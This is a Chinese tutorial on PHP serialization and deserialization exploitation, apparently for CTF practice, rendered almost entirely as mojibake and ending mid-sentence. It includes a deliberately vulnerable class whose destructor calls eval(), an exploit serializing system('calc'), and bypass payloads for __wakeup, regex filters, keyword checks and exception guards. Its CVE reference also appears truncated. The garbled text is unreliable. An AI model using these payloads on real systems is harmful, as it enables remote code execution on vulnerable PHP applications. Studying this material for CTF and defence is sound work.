åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡,ä½†ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•,åªä¼šä¿å­˜ç±»çš„åå­—.\nå¯¹è±¡åºåˆ—åŒ– serializeæ–¹æ³•,è¿”å›å­—ç¬¦ä¸²,æ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤ºvalueçš„å­—èŠ‚æµ,å¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹,æœ‰åˆ©äºå­˜å‚¨æˆ–ä¼ é€’PHPçš„å€¼,åŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„.\nå¯¹è±¡ååºåˆ—åŒ– unserializeæ–¹æ³•,å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œ,å°†å…¶è½¬æ¢å›PHPå€¼.\n\n å­—ç¬¦ä¸²å’Œæ•°å­—éƒ½å¯ä»¥åºåˆ—åŒ–/ååºåˆ—åŒ–\n\nç¬¬äºŒèŠ‚ phpçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–0x3 åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åºåˆ—åŒ–åºåˆ—åŒ–çš„æœ¬è´¨æ˜¯å°†å†…å­˜ä¸­çš„å¯¹è±¡,è½¬æ¢ä¸ºå¯ä»¥ä¿å­˜,ä¼ è¾“çš„å­—ç¬¦\nåœ¨phpä¸­,æˆ‘ä»¬ä¸ä»…å¯ä»¥åºåˆ—åŒ–å¯¹è±¡çš„å®ä¾‹,ä¹Ÿå¯ä»¥åºåˆ—åŒ–ä¸€äº›åŸºæœ¬ç±»å‹\nğŸŒ°\n&lt;?php$name = &quot;charmersix&quot;;echo serialize($name);?&gt;\n\nå¯ä»¥å¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²\n\nå…¶ä¸­ç¬¬ä¸€ä¸ªsè¡¨ç¤ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡ç±»å‹,sæŒ‡string\nåé¢ç´§è·Ÿä¸€ä¸ªå†’å·å’Œæ•°å­—,è¡¨ç¤ºå±æ€§çš„é•¿åº¦,åé¢å†’å·+åŒå¼•å·è¡¨ç¤ºå±æ€§çš„å†…å®¹\næˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•åºåˆ—åŒ–ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»\n&lt;?phpclass Animal&#123;  public $name;  public function eat()&#123;    return &quot;i can eat&quot;;  &#125;  public function sleep()&#123;    return &quot;i can sleep&quot;;  &#125;&#125;$a = new Animal();echo serialize ($a);\n\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–ä»¥åçš„å­—ç¬¦ä¸²\nO:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;\n\nä¸€ä¸ªå¯¹è±¡ï¼Œåå­—æ˜¯6ä¸ªå­—ç¬¦ï¼Œå†…å®¹æ˜¯Animalï¼Œæœ‰ä¸€ä¸ªå±æ€§ï¼Œæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œåå­—ç”±4ä¸ªå­—ç¬¦ç»„æˆï¼Œæ˜¯nameï¼Œæ²¡æœ‰å€¼ï¼Œæ˜¯Null\nå±æ€§æ˜¯æœ‰æƒé™çš„ï¼Œå½“å±æ€§æƒé™ä¸ºprotectedæ—¶,å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–ç»“æœä¸º:\nO:6:&quot;Animal&quot;:1:&#123;s:7:&quot;*name&quot;;N;&#125;O%3A6%3A%22Animal%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BN%3B%7D\n\nå±æ€§åå­—å‰åŠ äº†*è¡¨ç¤ºè¿™ä¸ªå±æ€§æ˜¯protectedæƒé™,å…¶å®è¿™é‡Œè¿˜æœ‰ä¸å¯è§å­—ç¬¦,å¯ä»¥çœ‹åˆ°é•¿åº¦æ˜¯7\né‚£ä¹ˆå¢åŠ çš„ä¸å¯è§å­—ç¬¦æ˜¯ä»€ä¹ˆå‘¢,å°±æ˜¯\\x00*\\x00,ä¸‰ä¸ªå­—ç¬¦åŠ ä¸Šnameçš„4ä¸ªå­—ç¬¦,åˆšå¥½æ˜¯7å­—ç¬¦,å¯ä»¥é€šè¿‡urlencodeå‘ç°ä¸å¯è§å­—ç¬¦,æ‰€ä»¥é‡åˆ°épublicå±æ€§è¿›è¡Œåºåˆ—åŒ–æ—¶,ä¸€å®šä¸è¦ç›´æ¥å¤åˆ¶è¾“å‡º,é™¤éè¿›è¡Œäº†urlencodeç¼–ç \nå¦‚æœæ˜¯ç§æœ‰å±æ€§ååºåˆ—åŒ–åæ˜¯ç±»å+å±æ€§\nO:6:&quot;Animal&quot;:1:&#123;s:12:&quot;Animalname&quot;;N;&#125;O%3A6%3A%22Animal%22%3A1%3A%7Bs%3A12%3A%22%00Animal%00name%22%3BN%3B%7D\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è™½ç„¶åºåˆ—åŒ–çš„æ˜¯å­ç±»,ä½†æ˜¯ä¼šæŠŠçˆ¶ç±»çš„ç§æœ‰å±æ€§ä¹Ÿåºåˆ—åŒ–è¿›å»,ç”šè‡³å¯ä»¥å§traitçœ‹æˆä¸€ç§ç‰¹æ®Šçš„ç»§æ‰¿ç±»,ä¹Ÿä¼šè¢«åºåˆ—åŒ–è¿›å»\næŠ½è±¡ç±»å’Œæ¥å£éƒ½æ— æ³•åºåˆ—åŒ–,ä½†æ˜¯åŒ¿åç±»å¯ä»¥åºåˆ—åŒ–\nå¯¹è±¡çš„å±æ€§ä¹Ÿå¯ä»¥ä¸ºå¯¹è±¡\nğŸŒ°\n&lt;?phptrait action&#123;  public $move = &quot;step&quot;;&#125;class Animal&#123;  public $name;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;&#125;class Human extends Animal&#123;  public $gender;  use action;  function think()&#123;  &#125;&#125;$a = new Animal();$h = new Human();$a -&gt; new = $h;echo serialize ($a);\n\nè¿™æ—¶å€™ï¼Œåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸º\nO:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;new&quot;;O:5:&quot;Human&quot;:3:&#123;s:6:&quot;gender&quot;;N;s:4:&quot;name&quot;;N;s:4:&quot;move&quot;;s:4:&quot;step&quot;;&#125;&#125;\n\nä¸€ä¸ªå¯¹è±¡,åå­—æ˜¯6ä¸ªå­—ç¬¦,å†…å®¹æ˜¯Animal,æœ‰1ä¸ªå±æ€§,å±æ€§åå­—æ˜¯å­—ç¬¦ä¸²,é•¿åº¦ä¸º4,å†…å®¹name,å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡,å¯¹è±¡åå­—æ˜¯5ä¸ªå­—ç¬¦,å†…å®¹æ˜¯Human,åŒ…å«ä¸‰ä¸ªå±æ€§,åˆ†åˆ«æ˜¯6ä¸ªå­—ç¬¦çš„gender,4ä¸ªå­—ç¬¦çš„name,ä»¥åŠ4ä¸ªå­—ç¬¦çš„move\næ€»ç»“:\nåºåˆ—åŒ–å°±æ˜¯å¯¹ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§,ç”¨å­—ç¬¦ä¸²æè¿°å‡ºæ¥,æ–¹ä¾¿ååºåˆ—åŒ–æ—¶è¿˜åŸ\nååºåˆ—åŒ–ååºåˆ—åŒ–æ˜¯å¯¹å·²ç»åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²,é‡æ–°æ„é€ å‡ºä¸€ä¸ªå¯¹è±¡ä½¿ç”¨unserialize\nğŸŒ°\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;&#125;$a = new Animal();//echo serialize ($a);//å¾—åˆ°åºåˆ—åŒ–ä»¥åçš„ç»“æœ$p = &#x27;O:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;&#125;&#x27;;$panda = unserialize ($p);echo $panda -&gt;name;\n\nå¯ä»¥çœ‹åˆ°è¾“å‡ºäº†ä¸€ä¸ªpanda\nphpå¯¹äºä¸è¯†åˆ«çš„ç±»è¢«ååºåˆ—åŒ–å,ä¼šç»™è‡ªåŠ¨åˆ†é…ä¸€ä¸ªç±»å,è¿™ä¸ªç±»åå°±æ˜¯__PHP_Incomplete_Class\næ€»ç»“:\n\nååºåˆ—åŒ–æ—¶,å¿…é¡»ååºåˆ—åŒ–å·²ç»å­˜åœ¨çš„ç±»\nunserializeå‡½æ•°çš„å‚æ•°,å¿…é¡»æ˜¯å­—ç¬¦ä¸²\nunserializeå‡½æ•°è¿”å›çš„æ˜¯è½¬æ¢ä¹‹åçš„å€¼,å¯ä¸ºintegerã€floatã€stringã€arrayã€æˆ–objectï¼Œå¦‚æœä¼ é€’çš„å­—ç¬¦ä¸²ä¸å¯è§£åºåˆ—åŒ–ï¼Œåˆ™è¿”å›false\n\nè¿™é‡Œè¯´çš„å­˜åœ¨çš„ç±»ï¼Œæ˜¯æŒ‡åœ¨PHPè„šæœ¬æˆ–æ‰€åŒ…å«çš„æ–‡ä»¶ä¸­ï¼Œæœ‰classå…³é”®å­—å®šä¹‰çš„ç±»\n0x4 PHPä¸­çš„é­”æœ¯æ–¹æ³•åœ¨phpä¸­ï¼Œå­˜åœ¨ä¼—å¤šçš„é­”æ³•æ–¹æ³•ï¼Œæ˜¯æ¯ä¸ªå¯¹è±¡é»˜è®¤éƒ½æœ‰çš„æ–¹æ³•ï¼Œä¸ç®¡å®šä¹‰ä¸å®šä¹‰ï¼Œéƒ½ä¼šå­˜åœ¨\né¦–å…ˆæ€»ç»“ä¸€ä¸‹å¹²è´§, æ–¹ä¾¿é£Ÿç”¨\n__constructï¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚__destructï¼šå’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œã€‚__callï¼šå½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚__get()ï¼šè·å–å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚__set()ï¼šè®¾ç½®å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚__toStringï¼šå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚__sleepï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„)__wakeupï¼šååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•__isset()ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset()ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__invoke() ï¼šå°†å¯¹è±¡å½“ä½œå‡½æ•°æ¥ä½¿ç”¨æ—¶æ‰§è¡Œæ­¤æ–¹æ³•\n\nsleepå’Œwakeupæ–¹æ³•é­”æ³•æ–¹æ³•æ˜¯ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„æ–¹æ³•\nå…¶ä¸­__sleepæ–¹æ³•æ˜¯åºåˆ—åŒ–çš„æ—¶å€™ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•\nserialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()å¦‚æœå­˜åœ¨,è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨,ç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ.æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡,å¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°æ•°ç»„.\nğŸŒ°\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;&#125;$a = new Animal();echo serialize ($a);\n\næ‰“å°ç»“æœä¸º\nO:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;//åºåˆ—åŒ–ååªæœ‰nameå’Œcolor\n\nåŒæ„__sleepæ–¹æ³•æ¸…ç†å,moveå±æ€§å¹¶æ²¡æœ‰è¿›å…¥åºåˆ—åŒ–åçš„ç»“æœå’Œ__sleepæ–¹æ³•å¯¹åº”çš„æ˜¯wakeupæ–¹æ³•,è¡¨ç¤ºååºåˆ—åŒ–æ—¶,å¯¹æ‰€ååºåˆ—åŒ–çš„å±æ€§è¿›è¡Œå¤„ç†wakeupå‡½æ•°å¯ä»¥ä¸éœ€è¦è¿”å›å€¼,æ—¶å¯¹å¯¹è±¡çš„å±æ€§è¿›è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œ\nğŸŒ°\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;  function __wakeup()&#123;    $this -&gt; name = &quot;tiger&quot;;  &#125;&#125;// $a = new Animal();// echo serialize ($a);$b = &#x27;O:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;&#x27;;$a = unserialize($b);echo $a -&gt; name;\n\nå¯ä»¥çœ‹åˆ°,æˆ‘ä»¬è¿™é‡Œååºåˆ—åŒ–çš„å±æ€§å€¼,ä¸ç®¡æ˜¯ä¸æ˜¯panda,æœ€ç»ˆååºåˆ—åŒ–å,éƒ½å˜æˆäº†tiger,æ‰€ä»¥wakeupæ–¹æ³•ä¼šåœ¨ååºåˆ—åŒ–å‰è¢«è°ƒç”¨,ç”¨æ¥æå‰å¤„ç†å±æ€§çš„å€¼\n\nconstructå’Œdestructæ–¹æ³•å’Œä¸Šé¢æ–¹æ³•ç±»ä¼¼,è¿™é‡Œæˆä¸ºæ„é€ å‡½æ•°å’Œææ„å‡½æ•°\nè¡¨ç¤ºå¯¹è±¡åœ¨å®ä¾‹åŒ–æ—¶æ‰§è¡Œçš„å‡½æ•°å’Œå¯¹è±¡è¦é”€æ¯å‰æ‰§è¡Œçš„å‡½æ•°\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;  function __wakeup()&#123;    $this -&gt; name = &quot;tiger&quot;;  &#125;  function __construct()&#123;    echo &quot;å¯¹è±¡è¢«newæ—¶æ‰§è¡Œ&lt;br&gt;&quot;;  &#125;  function __destruct()&#123;    echo &quot;å¯¹è±¡è¢«é”€æ¯æ—¶æ‰§è¡Œ&lt;br&gt;&quot;;  &#125;&#125;$a = new Animal();\n\nä¹Ÿå°±æ˜¯è¯´,åœ¨PHPä»£ç ä¸­,å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™,ä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„__constructæ–¹æ³•,å½“å‰phpè„šæœ¬å³å°†è¿è¡Œç»“æŸ,å°±ä¼šè°ƒç”¨å·²ç»å®ä¾‹åŒ–çš„ç±»çš„__destructæ–¹æ³• æ‰€ä»¥ä¸Šé¢çš„æ —å­ä¼šå…ˆè°ƒç”¨å‰è€…,å†è°ƒç”¨åè€….\nä½†æ˜¯,å¦‚æœå•çº¯çš„è¿›è¡Œååºåˆ—åŒ–,ä¸å®ä¾‹åŒ–å¯¹è±¡æ—¶,åªä¼šè°ƒç”¨__destructæ–¹æ³•\nè¿™é‡Œä¼šæ˜¯ä¸€ä¸ªæ˜æ˜¾çš„è°ƒç”¨å…¥å£,å¦‚æœæˆ‘ä»¬ååºåˆ—åŒ–ä¸€ä¸ªæ‹¥æœ‰__destructæ–¹æ³•çš„å¯¹è±¡æ—¶,ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªææ„æ–¹æ³•,è€Œå¦‚æœè¿™ä¸ªææ„æ–¹æ³•ä¸­,æœ‰æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å€¼,é‚£ä¹ˆå°±å¯ä»¥å®ç°æˆ‘ä»¬æ¶æ„ä»£ç å†…å®¹\nåœ¨phpååºåˆ—åŒ–åˆ©ç”¨ï¼Œææ„æ–¹æ³•æ˜¯å¾ˆå¥½çš„å…¥æ‰‹ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯èƒ½ä¸ä¸€å®šèƒ½å¤Ÿæ‰¾åˆ°éå¸¸åˆé€‚çš„ææ„æ–¹æ³•ä¾›æˆ‘ä»¬ä½¿ç”¨\ncallå’ŒcallStaticæ–¹æ³•åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶ï¼Œ__call()ä¼šè¢«è°ƒç”¨\nåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶, __callStatic()ä¼šè¢«è°ƒç”¨\n&lt;?phpclass ctfshow&#123;    public function __call($name,$args)&#123;        echo &quot;i called method&quot;.$name. &quot;&lt;br&gt;&quot;;        echo &quot;args is &lt;br&gt;&quot;;        print_r($args);    &#125;&#125;$cs = new ctfshow();$cs-&gt;go(1, &quot;CT&quot;,&quot;m4a1&quot;);?&gt;\n\ngetã€setå’Œissetã€unset\nåœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶,__set()ä¼šè¢«è°ƒç”¨.\nè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶,__get()ä¼šè¢«è°ƒç”¨.\nå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶,__isset()ä¼šè¢«è°ƒç”¨.\nå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶,__unset()ä¼šè¢«è°ƒç”¨.\n\ntostringæ–¹æ³•__toString()æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”.ä¾‹å¦‚echo $obj;åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆ.æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²,å¦åˆ™å°†å‘å‡ºä¸€æ¡E_RECOVERABLE_ERRORçº§åˆ«çš„è‡´å‘½é”™è¯¯.\n&lt;?phpclass secret&#123;    public $secret = &quot;you never know my secret&quot;;    public function show($name)&#123;        echo &quot;hey $name!&quot;.$this-&gt;secret ;    &#125;    public function __toString()&#123;        return $this -&gt; secret;    &#125;&#125;$c = new secret();echo $c;//ç›¸å½“äºæ‰§è¡Œ//echo $c-&gt;__toString();\n\næ‰§è¡Œç»“æœ\nyou never know my secret\n\nè¿™é‡Œç›´æ¥æ‰“å°å¯¹è±¡å®ä¾‹,ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„__toStringæ–¹æ³•,è¿™é‡Œæ–¹æ³•åå­—å¤§å°å†™ä¸æ•æ„Ÿ\ninvokeæ–¹æ³•å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨\n&lt;?phpclass secret&#123;  public $secret = &quot;you never know my secret&quot;;  public function show($name)&#123;    echo &quot;hey $name!&quot;.$this -&gt; secret;  &#125;  public function __invoke($name)&#123;    return $this -&gt;show($name);  &#125;&#125;$c = new secret();echo $c (&#x27;charmersix&#x27;);\n\næ‰§è¡Œç»“æœ\nhey charmersix!you never know my secret\n\nå‰é¢é­”æœ¯æ–¹æ³•åœ¨æˆ‘ä»¬æ„é€ ååºåˆ—åŒ–åˆ©ç”¨é“¾æ—¶éå¸¸æœ‰ç”¨ï¼Œå¿…é¡»æŒæ¡ï¼Œåé¢æ–¹æ³•ï¼Œç›¸å¯¹å†·åƒ»ï¼Œéœ€è¦ç†Ÿæ‚‰\nset_stateæ–¹æ³•è‡ªphp5.1.0èµ·,å½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶,æ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨\næœ¬æ–¹æ³•å”¯ä¸€çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„,å…¶ä¸­åŒ…å«array(&#39;property&#39;=&gt;value,...)æ ¼å¼æ’åˆ—çš„ç±»å±æ€§\næ³¨æ„,è¿™é‡Œæ˜¯é™æ€æ–¹æ³•,å’Œ__tostringæ–¹æ³•ç±»ä¼¼,ä¸è¿‡è¿™é‡Œä¸»è¦è¾“å‡ºç±»çš„å±æ€§ç»“æ„\nstatic object __set_state(array $properties)\n\ndebugInfoæ–¹æ³•array __debugInfo(void)\n\nå½“è°ƒç”¨var_dumpæ—¶,è°ƒç”¨è¿™ä¸ªæ–¹æ³•,æ˜¾ç¤ºç±»çš„å±æ€§å…·ä½“ç»“æ„å’Œå€¼\n0x5 ååºåˆ—åŒ–ä¸­çš„ç»•è¿‡ç»•è¿‡__wakeupæ–¹æ³•è¿™ä¸ªä¸»è¦æ˜¯åŸºäºCVE-2016-712\nå…·ä½“åˆ©ç”¨æ—¶é€šè¿‡æ‰‹åŠ¨ä¿®æ”¹ç±»çš„å±æ€§ä¸ªæ•°,è®©å‰åä¸ä¸€è‡´æ—¶,__wakeupå‡½æ•°å°±ä¼šç»•è¿‡æ‰§è¡Œ,è§¦å‘å¯èƒ½å­˜åœ¨çš„æ¼æ´\nåˆ©ç”¨æ¡ä»¶\n\nphp5-5.6.25\nphp7-7.0.10\n\nåœ¨è¿™ä¸ªç‰ˆæœ¬èŒƒå›´ä¹‹å†…,å¯ä»¥ç”¨è¿™ä¸ªç»•è¿‡æ–¹æ³•,å…·ä½“æˆ‘ä»¬çœ‹ä¸€ä¸ªæ —å­\nå°†æœ¬åœ°phpstudyä¸­çš„phpè°ƒæ•´åˆ°5.6\næºç \n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public $name;    public function __wakeup()    &#123;        $this-&gt;name=&#x27;phpinfo();&#x27;;        // TODO: Implement __wakeup() method.    &#125;    public function __destruct()&#123;        eval($this-&gt;name);    &#125;&#125;$data = $_POST[&#x27;data&#x27;];unserialize($data);\n\nexp\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public $name=&quot;system(&#x27;calc&#x27;);&quot;;    public function __wakeup()    &#123;        $this-&gt;name=&#x27;phpinfo();&#x27;;        // TODO: Implement __wakeup() method.    &#125;    public function __destruct()&#123;        eval($this-&gt;name);    &#125;&#125;//$data = $_POST[&#x27;data&#x27;];//unserialize($data);$b = new backdoor();echo serialize($b);\n\nè¿™é‡Œæˆ‘ä»¬ç”Ÿæˆçš„payloadæ˜¯\nO:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:15:&quot;system(&#x27;calc&#x27;);&quot;;&#125;//è¿™é‡Œçš„1è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå±æ€§,æˆ‘ä»¬æ‰‹åŠ¨æ”¹æˆ2,ä»£è¡¨æœ‰ä¸¤ä¸ª,ä½†æ˜¯å®é™…åªæœ‰ä¸€ä¸ª,å°±ä¼šæŠ¥é”™,ç»•è¿‡__wakeup\n\n+å·ç»•è¿‡æ­£åˆ™åŒ¹é…å¦‚æœåœ¨è¾“å…¥å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸å…è®¸è¾“å…¥ç±»ä¼¼O:8è¿™ç§å¼€å¤´,ä¸»è¦æ˜¯ä¸ºäº†é™åˆ¶ä¸èƒ½ååºåˆ—åŒ–å¯¹è±¡,è¿™æ—¶å€™,å¯ä»¥é€šè¿‡åœ¨æ•°å­—å‰é¢å¢åŠ ä¸€ä¸ª+å·è¿‡æ»¤,ç±»ä¼¼O:+8\nå¼•ç”¨ç»•è¿‡phpä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨å¼•ç”¨ç¬¦å·&amp;,è¿™é‡Œå°±æ˜¯ä¼ å€,å¦‚æœä¸åŠ ,å°±æ˜¯ä¼ å€¼\nä¼ å€¼çš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¼•ç”¨å¯ä»¥ä¸åŒ,ä½†æ˜¯æŒ‡å‘æ˜¯ç›¸åŒçš„\nä¾‹å¦‚\n&lt;?phperror_reporting(0);highlight_file(__FILE__);function add(&amp;$str)&#123;    $str = &quot;love&quot;.$str;    return $str;&#125;$a = &#x27;you&#x27;;add($a);echo $a;\n\nAsciiç ç»•è¿‡å¦‚æœåœ¨ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²så˜æ›´ä¸ºå¤§å†™çš„Så,å°±ä¼šæ”¯æŒå°†é‡Œé¢çš„å­—ç¬¦æŒ‰ç…§\\xxæ ¼å¼Asciiè¯»å–,ç»•è¿‡å¯¹å…³é”®å­—çš„æ£€æµ‹\nä¾‹å¦‚ï¼š\nO:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\nä¿®æ”¹åçš„payloadä¸º\nO:8:&quot;backdoor&quot;:1:&#123;S:4:&quot;n\\97me&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\nExceptionç»•è¿‡Exceptionæ˜¯å¼‚å¸¸ï¼Œçœ‹ä¸‹é¢æ —å­\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public function __destruct()&#123;        echo file_get_contents(&quot;/f1ag&quot;);    &#125;&#125;$data = $_POST[&#x27;data&#x27;];if(unserialize($data))&#123;    throw new Exception(&quot;not allow unserialize&quot;);&#125;\n\né€šè¿‡ç ´åé‡Œé¢çš„å±æ€§æ ¼å¼ï¼Œä½†æ˜¯ç±»åæ­£ç¡®çš„æƒ…å†µï¼Œè¿˜æ˜¯ä¼šæ‰§è¡Œç±»çš„ææ„æ–¹æ³•\npayloadå¦‚ä¸‹\nO:8:&quot;backdoor&quot;:1:&#123;1&#125;\n\nå­—ç¬¦é€ƒé€¸ç»•è¿‡phpåœ¨åºåˆ—åŒ–æ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœåºåˆ—åŒ–çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå°±ä¼šä¿ç•™è¯¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç„¶åå°†é•¿åº¦å†™å…¥åºåˆ—åŒ–åçš„æ•°æ®ï¼Œååºåˆ—åŒ–æ—¶å°±ä¼šæŒ‰ç…§é•¿åº¦è¿›è¡Œè¯»å–ï¼Œå¹¶ä¸”PHPåº•å±‚å®ç°ä¸Šæ˜¯ä»¥;ä½œä¸ºåˆ†å‰²&#125;ä½œä¸ºç»“å°¾\nç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–,è¿™é‡Œå°±ä¼šå‘ç”Ÿé€ƒé€¸é—®é¢˜,è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥\nğŸŒ°\n&lt;?phpclass backdoor&#123;    public $m;    public $c;&#125;$b = new backdoor();$b-&gt;m=&#x27;system&#x27;;$b-&gt;c=&#x27;ls&#x27;;echo serialize($b);\n\næ˜¾ç¤ºç»“æœ:\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:6:&quot;system;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\nè¿™é‡Œæˆ‘ä»¬å¦‚æœç”¨åŒå¼•å·,é—­åˆ,ä¼šå‘ç°ä¸èƒ½é—­åˆ\nå› 